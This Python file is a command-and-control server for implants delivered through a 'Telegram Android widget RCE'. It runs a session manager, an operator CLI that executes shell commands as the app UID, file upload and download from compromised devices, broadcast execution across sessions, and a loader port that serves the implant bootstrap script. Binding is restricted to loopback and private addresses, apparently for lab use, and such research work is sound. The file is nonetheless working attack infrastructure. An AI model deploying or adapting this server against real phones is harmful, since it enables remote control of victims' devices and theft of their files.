#!/usr/bin/env python3
"""Local-only C2 server for the Telegram Android widget RCE.

Python 3 standard library only.  Listens on loopback by default; a LAN bind
requires --allow-lan and a private address.  The server never makes outbound
connections: implants dial in, and the loader port only answers clients that
connect to it.

Protocol: newline-delimited JSON, one object per line.  All values the shell
implant parses are strings; commands/paths are base64.

    implant -> server: hello, pong, out, err, done, file, file_done,
                       put_ready, put_done, slept, ack, event, error
    server -> implant: ping, exec, get, put, put_begin, put_chunk, put_end,
                       sleep, reconnect, bye

Usage:
    python3 c2_server.py                       # 127.0.0.1:4444, CLI
    python3 c2_server.py --allow-lan --host <LAN_IP>
    python3 c2_server.py --cmd "sessions" --cmd "exec id" --cmd quit
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import shlex
import socket
import sys
import threading
import time
from datetime import datetime
from typing import Dict, List, Optional

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import c2common as common  # noqa: E402

PRINT_LOCK = threading.Lock()


def say(msg: str = "", err: bool = False) -> None:
    with PRINT_LOCK:
        print(msg, file=sys.stderr if err else sys.stdout, flush=True)


def ts() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


class SessionError(RuntimeError):
    pass


class SessionClosed(SessionError):
    pass


class RequestTimeout(SessionError):
    pass


class Pending:
    __slots__ = ("rid", "kind", "event", "out", "err", "files", "file_bytes",
                 "result", "error", "on_chunk")

    def __init__(self, rid: str, kind: str):
        self.rid = rid
        self.kind = kind
        self.event = threading.Event()
        self.out: List[str] = []
        self.err: List[str] = []
        self.files: Dict[int, bytes] = {}
        self.file_bytes = 0
        self.result: Optional[dict] = None
        self.error: Optional[str] = None
        self.on_chunk = None

    def finish(self, result: dict) -> None:
        self.result = result
        self.event.set()

    def fail(self, error: str) -> None:
        self.error = error
        self.event.set()


class RunLog:
    """Per-run directory: c2.log (human), history.jsonl (commands), and one
    JSONL file per session.  Payloads are redacted unless --log-payloads."""

    def __init__(self, root: str, log_payloads: bool = False):
        stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        base = os.path.join(root, "run-" + stamp)
        self.dir = base
        i = 1
        while True:
            try:
                os.makedirs(self.dir, exist_ok=False)
                break
            except FileExistsError:
                self.dir = "%s-%d" % (base, i)
                i += 1
        self.human_path = os.path.join(self.dir, "c2.log")
        self.history_path = os.path.join(self.dir, "history.jsonl")
        self.log_payloads = log_payloads
        self.lock = threading.Lock()
        self.human = open(self.human_path, "a", encoding="utf-8", buffering=1)

    def log(self, msg: str) -> None:
        with self.lock:
            self.human.write("%s %s\n" % (ts(), msg))
        say("[%s] %s" % (ts(), msg))

    def session_event(self, sid: int, direction: str, obj: dict) -> None:
        # per-chunk records would swamp the log; the human log and history
        # keep the meaningful events (commands, transfers, errors)
        if obj.get("op") in ("out", "err", "file", "put_chunk"):
            return
        path = os.path.join(self.dir, "session-%d.jsonl" % sid)
        rec = {"ts": ts(), "dir": direction, "sid": sid}
        red = {}
        for k, v in obj.items():
            if not self.log_payloads and k in ("b64", "cmd") and isinstance(v, str):
                red[k + "_len"] = len(v)
                if k == "cmd" and "cmd_text" in obj:
                    red["cmd"] = obj["cmd_text"]
            else:
                red[k] = v
        red.pop("cmd_text", None)
        rec["obj"] = red
        with self.lock:
            with open(path, "a", encoding="utf-8") as f:
                f.write(json.dumps(rec, separators=(",", ":")) + "\n")

    def command(self, sid: Optional[int], implant: str, text: str,
                ok: bool, detail: str = "") -> None:
        rec = {"ts": ts(), "sid": sid, "implant": implant, "cmd": text,
               "ok": ok, "detail": detail}
        with self.lock:
            with open(self.history_path, "a", encoding="utf-8") as f:
                f.write(json.dumps(rec, separators=(",", ":")) + "\n")

    def tail(self, n: int = 40) -> List[str]:
        try:
            with open(self.human_path, "r", encoding="utf-8") as f:
                return f.readlines()[-n:]
        except OSError:
            return []

    def history_tail(self, n: int = 20) -> List[str]:
        try:
            with open(self.history_path, "r", encoding="utf-8") as f:
                return f.readlines()[-n:]
        except OSError:
            return []

    def close(self) -> None:
        with self.lock:
            try:
                self.human.close()
            except OSError:
                pass


class Session:
    def __init__(self, sid: int, sock: socket.socket, addr, server: "C2Server"):
        self.sid = sid
        self.sock = sock
        self.addr = addr
        self.server = server
        self.send_lock = threading.Lock()
        self.pending_lock = threading.Lock()
        self.pending: Dict[str, Pending] = {}
        self.next_id = 1
        self.hello: dict = {}
        self.ready = False
        self.alive = True
        self.last_seen = time.time()
        self.last_ping = 0.0
        self.sleeping_until = 0.0
        self.close_reason = ""
        self.hello_event = threading.Event()
        self.reader = threading.Thread(target=self._reader_loop, daemon=True,
                                       name="sess-%d" % sid)
        self.sock.settimeout(None)

    # ------------------------------------------------------------- plumbing
    def start(self) -> None:
        self.reader.start()

    def _send(self, obj: dict) -> None:
        if not self.alive:
            raise SessionClosed("session %d is closed" % self.sid)
        data = json.dumps(obj, separators=(",", ":")).encode("utf-8") + b"\n"
        try:
            with self.send_lock:
                self.sock.sendall(data)
        except OSError as e:
            self.close("send failed: %s" % e)
            raise SessionClosed(str(e))
        self.server.log.session_event(self.sid, "out", obj)

    def send_raw(self, obj: dict) -> None:
        """Send without a pending request (ping, event)."""
        try:
            self._send(obj)
        except SessionError:
            pass

    def close(self, reason: str = "") -> None:
        if not self.alive:
            return
        self.alive = False
        self.close_reason = reason
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            self.sock.close()
        except OSError:
            pass
        with self.pending_lock:
            pend = list(self.pending.values())
            self.pending.clear()
        for p in pend:
            p.fail("session closed: %s" % (reason or "eof"))
        self.hello_event.set()
        self.server.session_gone(self)
        self.server.log.log("session %d closed (%s)" % (self.sid, reason or "eof"))

    # ------------------------------------------------------------- reader
    def _reader_loop(self) -> None:
        buf = b""
        bad = 0
        try:
            while self.alive:
                try:
                    data = self.sock.recv(65536)
                except OSError:
                    break
                if not data:
                    break
                self.last_seen = time.time()
                buf += data
                if len(buf) > common.MAX_LINE and b"\n" not in buf:
                    self.close("line too long")
                    return
                while b"\n" in buf:
                    raw, buf = buf.split(b"\n", 1)
                    if not raw.strip():
                        continue
                    if len(raw) > common.MAX_LINE:
                        self.close("line too long")
                        return
                    try:
                        obj = json.loads(raw.decode("utf-8"))
                        if not isinstance(obj, dict):
                            raise ValueError("not an object")
                    except (ValueError, UnicodeDecodeError) as e:
                        bad += 1
                        self.server.log.log("session %d bad json: %s" % (self.sid, e))
                        if bad > 20:
                            self.close("too many malformed lines")
                            return
                        continue
                    self.server.log.session_event(self.sid, "in", obj)
                    self._handle(obj)
                    if not self.alive:
                        return
        finally:
            if self.alive:
                self.close("peer closed")

    def _handle(self, obj: dict) -> None:
        op = str(obj.get("op", ""))
        rid = str(obj.get("id", ""))
        if op == "hello":
            if self.ready:
                return
            token = str(obj.get("token", ""))
            if self.server.token and token != self.server.token:
                self.server.log.log("session %d rejected: bad token from %s"
                                    % (self.sid, self.addr[0]))
                self.close("bad token")
                return
            self.hello = {k: str(v) for k, v in obj.items() if k != "op"}
            self.ready = True
            self.hello_event.set()
            self.server.log.log(
                "session %d hello implant=%s uid=%s user=%s device=%s pid=%s "
                "build=%s from=%s"
                % (self.sid, self.hello.get("implant", "?"),
                   self.hello.get("uid", "?"), self.hello.get("user", "?"),
                   self.hello.get("device", "?"), self.hello.get("pid", "?"),
                   self.hello.get("build", "?") or "?", self.addr[0]))
            # First server line: proves hello acceptance to the diagnostic
            # mode and gives the full implant a positive end-to-end signal.
            self.send_raw({"op": "welcome", "id": "", "session": str(self.sid),
                           "server": "c2", "build": self.hello.get("build", ""),
                           "ts": str(int(time.time()))})
            return

        if not self.ready:
            self.close("protocol: first line was not hello")
            return

        if op == "pong":
            with self.pending_lock:
                pp = self.pending.get(rid)
            if pp is not None:
                pp.finish({"ts": str(obj.get("ts", ""))})
                self._drop(rid)
            return
        if op == "event":
            self.server.log.log("session %d event: %s" % (self.sid,
                                json.dumps({k: v for k, v in obj.items() if k != "id"})))
            if obj.get("kind") == "app_restart":
                self.hello["pid"] = str(obj.get("pid", ""))
            return

        with self.pending_lock:
            p = self.pending.get(rid)
        if p is None:
            # late reply after a timeout, or an unsolicited ack/event.
            # Stream chunks are dropped silently: a timed-out exec may keep
            # producing them and must not flood the log.
            if op not in ("out", "err", "file", "put_chunk"):
                self.server.log.log("session %d unsolicited op=%s id=%s"
                                    % (self.sid, op, rid))
            return

        if op in ("out", "err"):
            try:
                chunk = base64.b64decode(str(obj.get("b64", ""))).decode("utf-8", "replace")
            except Exception:
                chunk = ""
            if op == "out":
                p.out.append(chunk)
            else:
                p.err.append(chunk)
            if p.on_chunk is not None:
                try:
                    p.on_chunk(op, chunk)
                except Exception:  # noqa: BLE001 - display callback must not kill the reader
                    pass
            return

        if op == "done":
            p.finish({
                "rc": str(obj.get("rc", "")),
                "out": "\n".join(p.out) + ("\n" if p.out else ""),
                "err": "\n".join(p.err) + ("\n" if p.err else ""),
                "out_lines": str(obj.get("out_lines", "")),
                "err_lines": str(obj.get("err_lines", "")),
                "trunc": str(obj.get("trunc", "0")),
                "timeout": str(obj.get("timeout", "0")),
            })
            self._drop(rid)
            return

        if op == "file":
            try:
                data = base64.b64decode(str(obj.get("b64", "")))
            except Exception:
                data = b""
            seq = str(obj.get("seq", "0"))
            try:
                p.files[int(seq)] = data
            except ValueError:
                p.files[len(p.files)] = data
            p.file_bytes += len(data)
            if p.file_bytes > self.server.max_get:
                p.fail("download exceeds --max-get")
                self._drop(rid)
            return

        if op == "file_done":
            try:
                got = b"".join(p.files[k] for k in sorted(p.files))
            except Exception:
                got = b""
            p.finish({
                "data": got,
                "size": str(obj.get("size", "")),
                "sha256": str(obj.get("sha256", "")),
                "name": str(obj.get("name", "")),
            })
            self._drop(rid)
            return

        if op == "put_done":
            p.finish({"path_b64": str(obj.get("path_b64", "")),
                      "size": str(obj.get("size", ""))})
            self._drop(rid)
            return

        if op == "put_ready":
            return

        if op == "slept":
            p.finish({"secs": str(obj.get("secs", ""))})
            self._drop(rid)
            return

        if op == "ack":
            p.finish({"what": str(obj.get("what", "")),
                      "stop": str(obj.get("stop", ""))})
            self._drop(rid)
            return

        if op == "error":
            p.fail(str(obj.get("msg", "implant error")))
            self._drop(rid)
            return

        # unknown op with a matching id: fail it rather than hang
        p.fail("unexpected op %r from implant" % op)
        self._drop(rid)

    def _drop(self, rid: str) -> None:
        with self.pending_lock:
            self.pending.pop(rid, None)

    # ------------------------------------------------------------- requests
    def request(self, op: str, fields: dict, timeout: float, kind: str = "",
                on_chunk=None) -> dict:
        with self.pending_lock:
            rid = str(self.next_id)
            self.next_id += 1
            p = Pending(rid, kind or op)
            p.on_chunk = on_chunk
            self.pending[rid] = p
        obj = {"op": op, "id": rid}
        obj.update(fields)
        try:
            self._send(obj)
        except SessionError:
            with self.pending_lock:
                self.pending.pop(rid, None)
            raise
        if not p.event.wait(timeout):
            with self.pending_lock:
                self.pending.pop(rid, None)
            raise RequestTimeout("no reply to %s within %.0fs" % (op, timeout))
        if p.error:
            raise SessionError(p.error)
        return p.result or {}


class C2Server:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.host = args.host
        self.port = args.port
        self.loader_port = args.loader_port
        self.token = args.token or ""
        self.max_get = args.max_get
        self.max_put = args.max_put
        self.exec_timeout = args.exec_timeout
        self.max_out = args.max_out
        self.ping_interval = args.ping_interval
        self.ping_timeout = args.ping_timeout
        self.download_dir = os.path.abspath(args.download_dir)
        os.makedirs(self.download_dir, exist_ok=True)
        self.log = RunLog(args.log_dir, args.log_payloads)
        self.stop = threading.Event()
        self.sessions: List[Session] = []
        self.cond = threading.Condition()
        self.next_sid = 1
        self.active: Optional[Session] = None
        self.lsock: Optional[socket.socket] = None
        self.loader_sock: Optional[socket.socket] = None
        self.threads: List[threading.Thread] = []

    # ------------------------------------------------------------- listeners
    def _listen(self, host: str, port: int) -> socket.socket:
        family = socket.AF_INET6 if ":" in host else socket.AF_INET
        s = socket.socket(family, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if family == socket.AF_INET6:
            try:
                s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 1)
            except OSError:
                pass
        s.bind((host, port))
        s.listen(16)
        s.settimeout(0.5)
        return s

    def bind(self) -> None:
        self.lsock = self._listen(self.host, self.port)
        if self.loader_port:
            self.loader_sock = self._listen(self.host, self.loader_port)

    def start(self) -> None:
        self.bind()
        for target, name in ((self._accept_loop, "accept"),
                             (self._loader_loop, "loader"),
                             (self._ping_loop, "ping")):
            if name == "loader" and not self.loader_sock:
                continue
            t = threading.Thread(target=target, daemon=True, name=name)
            t.start()
            self.threads.append(t)

        self.log.log("control listening on %s:%d" % (self.host, self.port))
        if self.loader_sock:
            self.log.log("loader listening on %s:%d" % (self.host, self.loader_port))
        self.log.log("logs: %s" % self.log.dir)
        self.log.log("downloads: %s" % self.download_dir)
        if self.loader_port:
            try:
                bcmd = common.bootstrap_command(
                    self.host, self.loader_port,
                    mock=bool(self.args.loader_mock_dir),
                    short=(getattr(self.args, "bootstrap", "toybox") == "nc"))
            except ValueError as e:
                bcmd = "unavailable (%s)" % e
            self.log.log("bootstrap: %s" % bcmd)
            if self.args.bootstrap_diag:
                self.log.log("DIAG bootstrap mode: the loader serves a one-shot "
                             "C2_DIAG=1 script; no supervisor is started")
        if not self.token:
            self.log.log("WARNING: no --token; any local process can impersonate an implant")

    def _accept_loop(self) -> None:
        assert self.lsock is not None
        while not self.stop.is_set():
            try:
                sock, addr = self.lsock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            if not common.check_peer(addr[0]):
                self.log.log("rejected non-private peer %s" % (addr[0],))
                try:
                    sock.close()
                except OSError:
                    pass
                continue
            with self.cond:
                sid = self.next_sid
                self.next_sid += 1
            sess = Session(sid, sock, addr, self)
            sess.start()
            # Wait for hello in a helper thread so one slow/bogus client
            # cannot stall the accept loop.
            threading.Thread(target=self._track, args=(sess,), daemon=True,
                             name="track-%d" % sid).start()

    def _track(self, sess: Session) -> None:
        if not sess.hello_event.wait(15) or not sess.ready:
            self.log.log("connection from %s did not send hello" % (sess.addr[0],))
            sess.close("no hello")
            return
        if not sess.alive:
            return
        if getattr(self.args, "prune_dead_on_connect", True):
            self.prune_dead()
        with self.cond:
            self.sessions.append(sess)
            self.cond.notify_all()
        say("[+] session %d: %s (%s@%s) from %s"
            % (sess.sid, sess.hello.get("implant", "?"),
               sess.hello.get("user", "?"), sess.hello.get("device", "?"),
               sess.addr[0]))

    def _loader_loop(self) -> None:
        assert self.loader_sock is not None
        while not self.stop.is_set():
            try:
                sock, addr = self.loader_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            if not common.check_peer(addr[0]):
                self.log.log("loader: rejected non-private peer %s" % (addr[0],))
                try:
                    sock.close()
                except OSError:
                    pass
                continue
            mock = bool(self.args.loader_mock_dir)
            try:
                script = common.render_bootstrap(
                    self.host, self.port, self.token,
                    mock=mock, mock_dir=self.args.loader_mock_dir,
                    diag=bool(self.args.bootstrap_diag),
                    diag_xtrace=bool(getattr(self.args, "diag_xtrace", False)))
            except Exception as e:  # noqa: BLE001
                self.log.log("loader: render failed: %s" % e)
                sock.close()
                continue
            self.log.log("loader: serving %d bytes to %s" % (len(script), addr[0]))
            try:
                sock.sendall(script.encode("utf-8"))
                try:
                    sock.shutdown(socket.SHUT_WR)
                except OSError:
                    pass
                time.sleep(0.3)
            except OSError as e:
                self.log.log("loader: send failed: %s" % e)
            finally:
                try:
                    sock.close()
                except OSError:
                    pass

    def _ping_loop(self) -> None:
        while not self.stop.wait(1.0):
            now = time.time()
            for sess in list(self.sessions):
                if not sess.alive:
                    continue
                if now < sess.sleeping_until:
                    continue
                if now - sess.last_seen > self.ping_timeout:
                    self.log.log("session %d ping timeout (%.0fs silent)"
                                 % (sess.sid, now - sess.last_seen))
                    sess.close("ping timeout")
                    continue
                # Ping on a fixed cadence even when the implant is streaming:
                # it is also the client's only proof that the server is alive
                # (toybox nc does not exit on a remote close while stdin is
                # held open).
                if now - sess.last_ping >= self.ping_interval:
                    sess.last_ping = now
                    sess.send_raw({"op": "ping", "id": ""})

    # ------------------------------------------------------------- lookup
    def session_gone(self, sess: Session) -> None:
        with self.cond:
            self.cond.notify_all()
        if self.active is sess:
            self.active = None

    def remove_session(self, sess: Session, close: bool = False,
                       reason: str = "") -> bool:
        """Drop one session from the in-memory table (optionally close it)."""
        if close and sess.alive:
            sess.close(reason or "removed")
        with self.cond:
            try:
                self.sessions.remove(sess)
            except ValueError:
                return False
            if self.active is sess:
                self.active = None
            self.cond.notify_all()
        return True

    def prune_dead(self) -> int:
        """Remove every session whose socket is no longer alive."""
        with self.cond:
            dead = [s for s in self.sessions if not s.alive]
        removed = 0
        for s in dead:
            if self.remove_session(s):
                removed += 1
        if removed:
            self.log.log("pruned %d dead session(s)" % removed)
        return removed

    def drop_sessions(self, key: str) -> List[int]:
        """Drop by sid, implant name, or 'all'. Live sessions are closed."""
        key = key.strip()
        with self.cond:
            if key in ("all", "*"):
                victims = list(self.sessions)
            else:
                victims = [s for s in self.sessions
                           if str(s.sid) == key
                           or s.hello.get("implant") == key]
        out = []
        for s in victims:
            if self.remove_session(s, close=True, reason="dropped by operator"):
                out.append(s.sid)
        return out

    def alive_sessions(self) -> List[Session]:
        with self.cond:
            return [s for s in self.sessions if s.alive]

    def wait_session(self, timeout: float, count: int = 1) -> Optional[Session]:
        end = time.time() + timeout
        with self.cond:
            while True:
                alive = [s for s in self.sessions if s.alive]
                if len(alive) >= max(1, count):
                    return alive[0]
                left = end - time.time()
                if left <= 0:
                    return None
                self.cond.wait(left)

    def wait_implant(self, implant: str, timeout: float,
                     exclude: Optional[int] = None) -> Optional[Session]:
        end = time.time() + timeout
        with self.cond:
            while True:
                for s in self.sessions:
                    if (s.alive and s.hello.get("implant") == implant
                            and s.sid != exclude):
                        return s
                left = end - time.time()
                if left <= 0:
                    return None
                self.cond.wait(left)

    def resolve_session(self) -> Session:
        if self.active is not None and self.active.alive:
            return self.active
        alive = self.alive_sessions()
        if len(alive) == 1:
            self.active = alive[0]
            return alive[0]
        if not alive:
            raise SessionError("no live session; wait for an implant to connect")
        raise SessionError("multiple sessions; use 'sessions' then 'use <sid>'")

    # ------------------------------------------------------------- operations
    def op_exec(self, sess: Session, cmd: str, timeout: Optional[float] = None,
                on_chunk=None) -> dict:
        to = float(timeout or self.exec_timeout)
        self.log.log("session %d exec [%s]: %s" % (sess.sid, sess.hello.get("implant"),
                                                   cmd[:300]))
        res = sess.request("exec", {
            "cmd": common.b64e(cmd),
            "timeout": str(int(to)),
            "max_out": str(self.max_out),
        }, timeout=to + 30, kind="exec", on_chunk=on_chunk)
        return res

    def put_file(self, sess: Session, local: str, remote: str) -> dict:
        with open(local, "rb") as f:
            data = f.read()
        sha = hashlib.sha256(data).hexdigest()
        b64 = common.b64e(data)
        if len(b64) <= self.max_put:
            return sess.request("put", {
                "path_b64": common.b64e(remote),
                "b64": b64,
                "size": str(len(data)),
                "sha256": sha,
            }, timeout=60, kind="put")

        # Chunked puts need one request id for the whole transfer.  Create the
        # pending first, then send begin/chunks/end, then wait.
        with sess.pending_lock:
            rid = str(sess.next_id)
            sess.next_id += 1
            p = Pending(rid, "put")
            sess.pending[rid] = p
        try:
            sess._send({"op": "put_begin", "id": rid,
                        "path_b64": common.b64e(remote),
                        "size": str(len(data)), "sha256": sha})
            step = 16384
            for off in range(0, len(data), step):
                chunk = data[off:off + step]
                sess._send({"op": "put_chunk", "id": rid,
                            "seq": str(off // step),
                            "b64": common.b64e(chunk)})
            sess._send({"op": "put_end", "id": rid, "sha256": sha})
        except SessionError:
            with sess.pending_lock:
                sess.pending.pop(rid, None)
            raise
        if not p.event.wait(60 + len(data) / 4096.0):
            with sess.pending_lock:
                sess.pending.pop(rid, None)
            raise RequestTimeout("put timed out")
        if p.error:
            raise SessionError(p.error)
        self.log.log("session %d put %s -> %s (%d bytes, chunked)"
                     % (sess.sid, local, remote, len(data)))
        return p.result or {}

    def get_file(self, sess: Session, remote: str, local: Optional[str]) -> dict:
        res = sess.request("get", {"path_b64": common.b64e(remote)},
                           timeout=600, kind="get")
        data = res.get("data", b"")
        if not isinstance(data, bytes):
            data = b""
        want = res.get("sha256", "")
        got = hashlib.sha256(data).hexdigest()
        if want and want != got:
            raise SessionError("sha256 mismatch: implant=%s received=%s" % (want, got))

        name = os.path.basename(remote) or "download.bin"
        if local:
            path = os.path.abspath(os.path.expanduser(local))
            if not self.args.allow_any_output:
                base = os.path.abspath(self.download_dir)
                if os.path.commonpath([base, path]) != base:
                    raise SessionError(
                        "local path %s is outside %s (use --allow-any-output)"
                        % (path, base))
        else:
            path = os.path.join(self.download_dir, name)
        path = self._unique(path)
        part = path + ".part"
        with open(part, "wb") as f:
            f.write(data)
        os.replace(part, path)
        os.chmod(path, 0o600)
        self.log.log("session %d get %s -> %s (%d bytes sha256=%s)"
                     % (sess.sid, remote, path, len(data), got))
        return {"path": path, "size": len(data), "sha256": got}

    @staticmethod
    def _unique(path: str) -> str:
        if not os.path.exists(path):
            return path
        i = 1
        while True:
            cand = "%s.%d" % (path, i)
            if not os.path.exists(cand):
                return cand
            i += 1

    def shutdown(self) -> None:
        self.stop.set()
        for s in self.alive_sessions():
            s.close("server shutdown")
        for sock in (self.lsock, self.loader_sock):
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
        self.log.log("server stopped")


# ---------------------------------------------------------------------- CLI
HELP = """\
Commands:
  sessions | ls            list sessions (live and dead)
  sessions clean | prune   remove dead sessions from the table
  sessions clear           remove ALL sessions (closes live ones)
  drop <sid|implant|all>   remove one session (or all)
  use <sid|implant>        select the active session
  info                     details of the active session
  ping                     round-trip check
  exec <cmd>  or  !<cmd>   run a shell command as the app UID
  <cmd>                    (auto-shell) same as exec <cmd> when enabled
  put <local> <remote>     upload a file (chunked when large)
  get <remote> [local]     download a file (default: downloads/basename)
  sleep <secs>             ask the implant to pause
  reconnect [delay]        drop the socket and wait for the new session
  bye [stop]               close the session (stop=1 stops the supervisor)
  broadcast exec <cmd>     run on every live session
  wait <secs>              wait for the next session
  pause <secs>             host-side sleep (batch/tests, no implant traffic)
  history [n]              last commands
  log [n]                  tail of this run's log
  help                     this text
  quit | exit              stop the server
"""


class CLI:
    def __init__(self, server: C2Server, auto_shell: bool = False):
        self.s = server
        self.auto_shell = auto_shell

    def _active(self) -> Session:
        return self.s.resolve_session()

    def run_line(self, line: str) -> str:
        line = line.strip()
        if not line or line.startswith("#"):
            return "ok"
        try:
            if line in ("quit", "exit"):
                return "quit"
            if line in ("help", "?"):
                say(HELP)
                return "ok"
            if line in ("sessions", "ls"):
                self.cmd_sessions()
                return "ok"
            if line in ("sessions clean", "sessions prune", "prune"):
                n = self.s.prune_dead()
                say("[*] removed %d dead session(s)" % n)
                return "ok"
            if line in ("sessions clear", "sessions drop all"):
                ids = self.s.drop_sessions("all")
                say("[*] removed %d session(s)%s"
                    % (len(ids), (" (%s)" % ",".join(map(str, ids))) if ids else ""))
                return "ok"
            if line.startswith("drop "):
                key = line[5:].strip()
                ids = self.s.drop_sessions(key)
                if not ids:
                    raise SessionError("no matching session: %s" % key)
                say("[*] removed %d session(s): %s"
                    % (len(ids), ",".join(map(str, ids))))
                return "ok"
            if line.startswith("use "):
                self.cmd_use(line[4:].strip())
                return "ok"
            if line == "info":
                self.cmd_info()
                return "ok"
            if line == "ping":
                self.cmd_ping()
                return "ok"
            if line.startswith("exec "):
                self.cmd_exec(line[5:], line)
                return "ok"
            if line.startswith("!"):
                self.cmd_exec(line[1:], line)
                return "ok"
            if line.startswith("put "):
                parts = shlex.split(line)
                if len(parts) != 3:
                    raise SessionError("usage: put <local> <remote>")
                self.cmd_put(parts[1], parts[2], line)
                return "ok"
            if line.startswith("get "):
                parts = shlex.split(line)
                if len(parts) not in (2, 3):
                    raise SessionError("usage: get <remote> [local]")
                self.cmd_get(parts[1], parts[2] if len(parts) == 3 else None, line)
                return "ok"
            if line.startswith("sleep "):
                self.cmd_sleep(line[6:].strip(), line)
                return "ok"
            if line.startswith("reconnect"):
                parts = line.split()
                delay = int(parts[1]) if len(parts) > 1 else 2
                self.cmd_reconnect(delay, line)
                return "ok"
            if line.startswith("bye"):
                parts = line.split()
                stop = len(parts) > 1 and parts[1] in ("stop", "1", "--stop")
                self.cmd_bye(stop, line)
                return "ok"
            if line.startswith("broadcast exec "):
                self.cmd_broadcast(line[15:], line)
                return "ok"
            if line.startswith("wait "):
                self.cmd_wait(line[5:].strip())
                return "ok"
            if line.startswith("pause "):
                n = float(line[6:].strip())
                time.sleep(min(max(n, 0.0), 3600.0))
                return "ok"
            if line.startswith("history"):
                parts = line.split()
                n = int(parts[1]) if len(parts) > 1 else 20
                for row in self.s.log.history_tail(n):
                    try:
                        rec = json.loads(row)
                        say("%s  s%s %-12s %-3s %s"
                            % (rec.get("ts", ""), rec.get("sid", "-"),
                               (rec.get("implant", "") or "-")[:12],
                               "ok" if rec.get("ok") else "ERR",
                               rec.get("cmd", "")))
                    except ValueError:
                        say(row.rstrip("\n"))
                return "ok"
            if line.startswith("log"):
                parts = line.split()
                n = int(parts[1]) if len(parts) > 1 else 40
                for row in self.s.log.tail(n):
                    say(row.rstrip("\n"))
                return "ok"
            if self.auto_shell:
                # Direct shell mode: anything that is not a C2 command is
                # executed on the active session as-is.
                self.cmd_exec(line, line)
                return "ok"
            raise SessionError("unknown command; type 'help'")
        except (SessionError, OSError, ValueError) as e:
            say("[!] %s" % e, err=True)
            self.s.log.command(None, "", line, False, str(e))
            return "error"

    # ------------------------------------------------------------- commands
    def cmd_sessions(self) -> None:
        with self.s.cond:
            rows = list(self.s.sessions)
        if not rows:
            say("(no sessions yet)")
            return
        say("  SID  ST  IMPLANT              UID     DEVICE             PID    PEER")
        for x in rows:
            mark = "*" if x is self.s.active and x.alive else " "
            say("%s %4d  %-2s  %-19s %-7s %-18s %-6s %s"
                % (mark, x.sid, "up" if x.alive else "down",
                   x.hello.get("implant", "?")[:19],
                   x.hello.get("uid", "?"),
                   x.hello.get("device", "?")[:18],
                   x.hello.get("pid", "?"),
                   x.addr[0]))

    def cmd_use(self, key: str) -> None:
        with self.s.cond:
            rows = list(self.s.sessions)
        matches = [x for x in rows
                   if str(x.sid) == key or x.hello.get("implant") == key]
        if not matches:
            raise SessionError("no such session: %s" % key)
        # a reconnect leaves the old session in the list; prefer the live one
        for x in matches:
            if x.alive:
                self.s.active = x
                say("[*] active session %d (%s)" % (x.sid, x.hello.get("implant", "?")))
                return
        raise SessionError("session %s is down" % key)

    def cmd_info(self) -> None:
        x = self._active()
        say("session %d  %s" % (x.sid, "up" if x.alive else "down"))
        for k in ("implant", "uid", "user", "device", "android", "app", "pid",
                  "version", "mock", "ts"):
            say("  %-8s %s" % (k, x.hello.get(k, "")))
        say("  peer     %s:%s" % (x.addr[0], x.addr[1]))

    def cmd_ping(self) -> None:
        x = self._active()
        t0 = time.time()
        x.request("ping", {}, timeout=10, kind="ping")
        say("[+] pong %.0f ms" % ((time.time() - t0) * 1000))

    @staticmethod
    def _print_chunk(stream: str, chunk: str) -> None:
        target = sys.stdout if stream == "out" else sys.stderr
        with PRINT_LOCK:
            target.write(chunk + "\n")
            target.flush()

    def cmd_exec(self, cmd: str, raw: str) -> None:
        x = self._active()
        t0 = time.time()
        res = self.s.op_exec(x, cmd, on_chunk=self._print_chunk)
        dt = time.time() - t0
        flags = []
        if res.get("trunc") == "1":
            flags.append("truncated")
        if res.get("timeout") == "1":
            flags.append("timeout")
        say("[exec rc=%s %.2fs%s]" % (res.get("rc", "?"), dt,
                                     (" " + ",".join(flags)) if flags else ""))
        self.s.log.command(x.sid, x.hello.get("implant", ""), raw, True,
                           "rc=%s" % res.get("rc"))

    def cmd_put(self, local: str, remote: str, raw: str) -> None:
        x = self._active()
        if not os.path.isfile(local):
            raise SessionError("local file not found: %s" % local)
        t0 = time.time()
        res = self.s.put_file(x, local, remote)
        say("[put] %s -> %s (%s bytes, %.2fs)"
            % (local, remote, res.get("size", "?"), time.time() - t0))
        self.s.log.command(x.sid, x.hello.get("implant", ""), raw, True)

    def cmd_get(self, remote: str, local: Optional[str], raw: str) -> None:
        x = self._active()
        res = self.s.get_file(x, remote, local)
        say("[get] %s -> %s (%d bytes sha256=%s)"
            % (remote, res["path"], res["size"], res["sha256"]))
        self.s.log.command(x.sid, x.hello.get("implant", ""), raw, True)

    def cmd_sleep(self, arg: str, raw: str) -> None:
        x = self._active()
        n = int(arg)
        if n < 0 or n > 3600:
            raise SessionError("sleep range is 0..3600")
        res = x.request("sleep", {"secs": str(n)}, timeout=15, kind="sleep")
        x.sleeping_until = time.time() + n + 5
        x.last_seen = time.time()
        say("[sleep] %ss" % res.get("secs", n))
        self.s.log.command(x.sid, x.hello.get("implant", ""), raw, True)

    def cmd_reconnect(self, delay: int, raw: str) -> None:
        x = self._active()
        implant = x.hello.get("implant", "")
        x.request("reconnect", {"delay": str(delay)}, timeout=15, kind="reconnect")
        say("[reconnect] waiting for %s ..." % implant)
        new = self.s.wait_implant(implant, timeout=delay + 20, exclude=x.sid)
        if new is None:
            raise SessionError("implant did not reconnect within %ss" % (delay + 20))
        self.s.active = new
        say("[reconnect] session %d is back" % new.sid)
        self.s.log.command(x.sid, implant, raw, True, "new sid=%d" % new.sid)

    def cmd_bye(self, stop: bool, raw: str) -> None:
        x = self._active()
        implant = x.hello.get("implant", "")
        res = x.request("bye", {"stop": "1" if stop else "0"},
                        timeout=15, kind="bye")
        say("[bye] %s stop=%s" % (implant, res.get("stop", "0")))
        for _ in range(50):
            if not x.alive:
                break
            time.sleep(0.1)
        if stop:
            self.s.active = None
